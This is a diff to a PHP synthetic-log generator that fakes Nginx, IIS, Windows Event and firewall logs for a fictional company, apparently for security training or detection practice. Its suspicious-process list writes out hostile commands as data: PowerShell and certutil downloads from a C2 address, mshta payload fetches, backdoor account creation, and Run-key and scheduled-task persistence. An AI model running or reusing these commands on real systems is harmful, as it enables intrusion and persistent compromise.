@@ -227,6 +227,13 @@ function pick($arr) {
 }
 
 /**
+ * Helper: get an advanced override value, or return default
+ */
+function getOverride($key, $default = null) {
+    return $GLOBALS['pulse_overrides'][$key] ?? $default;
+}
+
+/**
  * Helper: pick N unique random elements
  */
 function pickN($arr, $n) {
@@ -251,4 +258,240 @@ function formatLogLine($ip, $timestamp, $method, $path, $httpVer, $status, $size
         '%s - - [%s] "%s %s %s" %d %d "%s" "%s"',
         $ip, $dateStr, $method, $path, $httpVer, $status, $size, $referer, $ua
     );
+}
+
+// ============================================================
+// Nginx Configuration
+// ============================================================
+
+/**
+ * Format a Nginx Combined Log line (with request_time + upstream)
+ * Distinguishable from Apache by the extra fields at the end
+ */
+function formatNginxLogLine($ip, $timestamp, $method, $path, $httpVer, $status, $size, $referer, $ua, $requestTime = null, $upstreamTime = null) {
+    $dateStr = $timestamp->format('d/M/Y:H:i:s O');
+    $rt = $requestTime ?? (mt_rand(1, 5000) / 1000);
+    $ut = $upstreamTime ?? ($rt - (mt_rand(0, 100) / 1000));
+    $ut = max(0, $ut);
+    return sprintf(
+        '%s - - [%s] "%s %s %s" %d %d "%s" "%s" rt=%.3f uct="%.3f" uht="%.3f" urt="%.3f"',
+        $ip, $dateStr, $method, $path, $httpVer, $status, $size, $referer, $ua,
+        $rt, 0.000, $ut, $ut
+    );
+}
+
+// ============================================================
+// IIS Configuration
+// ============================================================
+
+// IIS W3C header
+define('IIS_HEADER', "#Software: Microsoft Internet Information Services 10.0\n#Version: 1.0\n#Date: %s\n#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port cs-username c-ip cs(User-Agent) cs(Referer) sc-status sc-substatus sc-win32-status time-taken\n");
+
+// IIS server IP
+define('IIS_SERVER_IP', '192.168.1.10');
+
+// IIS ASP.NET app paths (fake corporate intranet: "NovaCRM")
+define('IIS_NORMAL_PATHS', [
+    ['GET', '/Default.aspx', '-', 200],
+    ['GET', '/Home/Index', '-', 200],
+    ['GET', '/Products/List', '-', 200],
+    ['GET', '/Products/Detail', 'id=1', 200],
+    ['GET', '/Products/Detail', 'id=2', 200],
+    ['GET', '/Products/Detail', 'id=3', 200],
+    ['GET', '/Products/Detail', 'id=5', 200],
+    ['GET', '/Products/Detail', 'id=8', 200],
+    ['GET', '/Content/Page', 'view=about', 200],
+    ['GET', '/Content/Page', 'view=contact', 200],
+    ['GET', '/Content/Page', 'view=faq', 200],
+    ['GET', '/Content/Page', 'view=terms', 200],
+    ['GET', '/Content/Page', 'view=careers', 200],
+    ['GET', '/Account/Login', '-', 200],
+    ['POST', '/Account/Login', '-', 302],
+    ['GET', '/Account/Register', '-', 200],
+    ['GET', '/Account/Profile', '-', 200],
+    ['GET', '/Dashboard', '-', 200],
+    ['GET', '/Reports/Monthly', '-', 200],
+    ['GET', '/api/v1/products', 'page=1', 200],
+    ['GET', '/api/v1/notifications', '-', 200],
+    ['GET', '/Content/css/site.css', '-', 200],
+    ['GET', '/Content/css/bootstrap.min.css', '-', 200],
+    ['GET', '/Scripts/jquery-3.7.1.min.js', '-', 200],
+    ['GET', '/Scripts/bootstrap.bundle.min.js', '-', 200],
+    ['GET', '/Scripts/site.js', '-', 200],
+    ['GET', '/Content/images/logo.png', '-', 200],
+    ['GET', '/Content/images/banner.jpg', '-', 200],
+    ['GET', '/favicon.ico', '-', 200],
+]);
+
+// IIS User-Agents (URL-encoded + in format)
+define('IIS_USER_AGENTS', [
+    'Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/120.0.0.0+Safari/537.36',
+    'Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:121.0)+Gecko/20100101+Firefox/121.0',
+    'Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/119.0.0.0+Safari/537.36+Edg/119.0.0.0',
+    'Mozilla/5.0+(compatible;+Googlebot/2.1;++http://www.google.com/bot.html)',
+]);
+
+define('IIS_ATTACKER_AGENTS', [
+    'Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/120.0.0.0+Safari/537.36',
+    'python-requests/2.31.0',
+    'Mozilla/5.0+(compatible;+Nmap+Scripting+Engine;+https://nmap.org/book/nse.html)',
+]);
+
+/**
+ * Format an IIS W3C Extended Log line
+ */
+function formatIisLogLine($timestamp, $serverIp, $method, $uriStem, $uriQuery, $port, $username, $clientIp, $ua, $referer, $status, $subStatus, $win32Status, $timeTaken) {
+    $dateStr = $timestamp->format('Y-m-d');
+    $timeStr = $timestamp->format('H:i:s');
+    return sprintf(
+        '%s %s %s %s %s %s %d %s %s %s %s %d %d %d %d',
+        $dateStr, $timeStr, $serverIp, $method, $uriStem, $uriQuery,
+        $port, $username, $clientIp, $ua, $referer,
+        $status, $subStatus, $win32Status, $timeTaken
+    );
+}
+
+// ============================================================
+// Windows Event Log Configuration
+// ============================================================
+
+define('WIN_HOSTNAME', 'NOVA-WEB01');
+define('WIN_DOMAIN', 'NOVACORP');
+
+// Legitimate Windows users
+define('WIN_LEGIT_USERS', [
+    'svc_web', 'svc_sql', 'Administrator', 'j.smith', 'a.johnson',
+    'm.williams', 'b.davis', 'svc_backup', 'svc_monitor', 'SYSTEM',
+]);
+
+// Legitimate Windows workstation names
+define('WIN_WORKSTATIONS', [
+    'WKS-ADMIN01', 'WKS-DEV03', 'WKS-HR02', 'WKS-FIN01',
+    'WKS-MKT01', 'JUMP-01', 'SRV-MGMT01',
+]);
+
+// Bruteforce target usernames
+define('WIN_BRUTE_USERS', [
+    'Administrator', 'admin', 'Guest', 'j.smith', 'a.johnson',
+    'svc_web', 'svc_sql', 'backup', 'test', 'user',
+    'helpdesk', 'support', 'sa', 'dba',
+]);
+
+// Suspicious process chains
+define('WIN_SUSPICIOUS_PROCS', [
+    ['cmd.exe', 'C:\\Windows\\System32\\cmd.exe', '/c whoami'],
+    ['cmd.exe', 'C:\\Windows\\System32\\cmd.exe', '/c hostname'],
+    ['cmd.exe', 'C:\\Windows\\System32\\cmd.exe', '/c ipconfig /all'],
+    ['cmd.exe', 'C:\\Windows\\System32\\cmd.exe', '/c net user'],
+    ['cmd.exe', 'C:\\Windows\\System32\\cmd.exe', '/c net localgroup administrators'],
+    ['cmd.exe', 'C:\\Windows\\System32\\cmd.exe', '/c netstat -ano'],
+    ['cmd.exe', 'C:\\Windows\\System32\\cmd.exe', '/c tasklist'],
+    ['cmd.exe', 'C:\\Windows\\System32\\cmd.exe', '/c systeminfo'],
+    ['cmd.exe', 'C:\\Windows\\System32\\cmd.exe', '/c nltest /dclist:'],
+    ['cmd.exe', 'C:\\Windows\\System32\\cmd.exe', '/c net group "Domain Admins" /domain'],
+    ['powershell.exe', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '-ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://185.156.73.54/rev.ps1\')"'],
+    ['powershell.exe', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '-c "Get-Process | Out-File C:\\Windows\\Temp\\p.txt"'],
+    ['powershell.exe', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '-enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoA'],
+    ['certutil.exe', 'C:\\Windows\\System32\\certutil.exe', '-urlcache -split -f http://185.156.73.54/payload.exe C:\\Windows\\Temp\\svchost.exe'],
+    ['net.exe', 'C:\\Windows\\System32\\net.exe', 'user hacker P@ssw0rd123! /add'],
+    ['net.exe', 'C:\\Windows\\System32\\net.exe', 'localgroup administrators hacker /add'],
+    ['reg.exe', 'C:\\Windows\\System32\\reg.exe', 'add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Windows\\Temp\\svchost.exe'],
+    ['schtasks.exe', 'C:\\Windows\\System32\\schtasks.exe', '/create /tn "WindowsUpdate" /tr C:\\Windows\\Temp\\svchost.exe /sc onstart /ru SYSTEM'],
+    ['mshta.exe', 'C:\\Windows\\System32\\mshta.exe', 'http://185.156.73.54/payload.hta'],
+    ['rundll32.exe', 'C:\\Windows\\System32\\rundll32.exe', 'C:\\Windows\\Temp\\mal.dll,DllMain'],
+]);
+
+// Normal Windows processes for noise
+define('WIN_NORMAL_PROCS', [
+    ['svchost.exe', 'C:\\Windows\\System32\\svchost.exe', '-k netsvcs -p'],
+    ['taskhostw.exe', 'C:\\Windows\\System32\\taskhostw.exe', ''],
+    ['RuntimeBroker.exe', 'C:\\Windows\\System32\\RuntimeBroker.exe', '-Embedding'],
+    ['SearchIndexer.exe', 'C:\\Windows\\System32\\SearchIndexer.exe', '/Embedding'],
+    ['MsMpEng.exe', 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2301.6-0\\MsMpEng.exe', ''],
+    ['w3wp.exe', 'C:\\Windows\\System32\\inetsrv\\w3wp.exe', '-ap "DefaultAppPool"'],
+    ['sqlservr.exe', 'C:\\Program Files\\Microsoft SQL Server\\MSSQL16.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe', '-sMSSQLSERVER'],
+    ['conhost.exe', 'C:\\Windows\\System32\\conhost.exe', '0x4'],
+    ['WmiPrvSE.exe', 'C:\\Windows\\System32\\wbem\\WmiPrvSE.exe', ''],
+    ['spoolsv.exe', 'C:\\Windows\\System32\\spoolsv.exe', ''],
+]);
+
+/**
+ * Format a Windows Event Log CSV line
+ */
+function formatWinEventLine($timestamp, $eventId, $level, $computer, $source, $message) {
+    $dateStr = $timestamp->format('Y-m-d\TH:i:s.v\Z');
+    // Escape CSV fields
+    $message = '"' . str_replace('"', '""', $message) . '"';
+    return sprintf('%s,%d,%s,%s,%s,%s',
+        $dateStr, $eventId, $level, $computer, $source, $message
+    );
+}
+
+// ============================================================
+// Firewall (iptables) Configuration
+// ============================================================
+
+define('FW_HOSTNAME', 'fw-gw01');
+define('FW_INTERNAL_NET', '192.168.1.');
+define('FW_DMZ_NET', '10.10.10.');
+define('FW_SERVER_IP', '10.10.10.5');
+
+// Common legitimate destination ports
+define('FW_LEGIT_PORTS', [80, 443, 53, 123, 8080, 3306, 5432, 22, 25, 587, 993]);
+
+// Common legitimate external IPs (CDN, DNS, etc.)
+define('FW_LEGIT_DEST_IPS', [
+    '8.8.8.8', '8.8.4.4', '1.1.1.1',              // DNS
+    '13.107.42.14', '13.107.21.200',                // Microsoft
+    '142.250.80.46', '142.250.80.78',               // Google
+    '104.16.132.229', '104.16.133.229',             // Cloudflare
+    '151.101.1.69', '151.101.65.69',                // Reddit/Fastly
+    '52.96.108.34', '52.96.110.18',                 // O365
+    '34.120.54.55', '35.186.238.101',               // GCP
+]);
+
+// C2 server IPs (for beaconing scenario)
+define('FW_C2_IPS', [
+    '185.156.73.54',
+    '45.155.205.233',
+    '194.26.135.89',
+]);
+
+/**
+ * Format an iptables-style firewall log line
+ */
+function formatFwLogLine($timestamp, $hostname, $action, $inIf, $outIf, $srcIp, $dstIp, $proto, $srcPort, $dstPort, $extra = '') {
+    $day = (int)$timestamp->format('j');
+    if ($day < 10) {
+        $dateStr = $timestamp->format('M') . '  ' . $day . $timestamp->format(' H:i:s');
+    } else {
+        $dateStr = $timestamp->format('M j H:i:s');
+    }
+    $kernTs = mt_rand(100000, 999999) . '.' . mt_rand(100, 999);
+    $mac = sprintf('00:50:56:%02x:%02x:%02x:00:0c:29:%02x:%02x:%02x:08:00',
+        mt_rand(0,255), mt_rand(0,255), mt_rand(0,255),
+        mt_rand(0,255), mt_rand(0,255), mt_rand(0,255));
+
+    $line = sprintf(
+        '%s %s kernel: [%s] [%s] IN=%s OUT=%s MAC=%s SRC=%s DST=%s LEN=%d TOS=0x00 PREC=0x00 TTL=%d ID=%d PROTO=%s',
+        $dateStr, $hostname, $kernTs, $action,
+        $inIf, $outIf, $mac, $srcIp, $dstIp,
+        mt_rand(40, 1500), mt_rand(48, 128), mt_rand(1, 65535), $proto
+    );
+
+    if ($proto === 'TCP' || $proto === 'UDP') {
+        $line .= sprintf(' SPT=%d DPT=%d', $srcPort, $dstPort);
+    }
+    if ($proto === 'TCP') {
+        $flags = $extra ?: 'SYN';
+        $line .= ' WINDOW=' . mt_rand(8192, 65535) . ' RES=0x00 ' . $flags . ' URGP=0';
+    }
+    if ($proto === 'UDP') {
+        $line .= ' LEN=' . mt_rand(20, 512);
+    }
+    if ($proto === 'ICMP') {
+        $line .= ' TYPE=8 CODE=0 ID=' . mt_rand(1, 65535) . ' SEQ=' . mt_rand(1, 100);
+    }
+
+    return $line;
 }
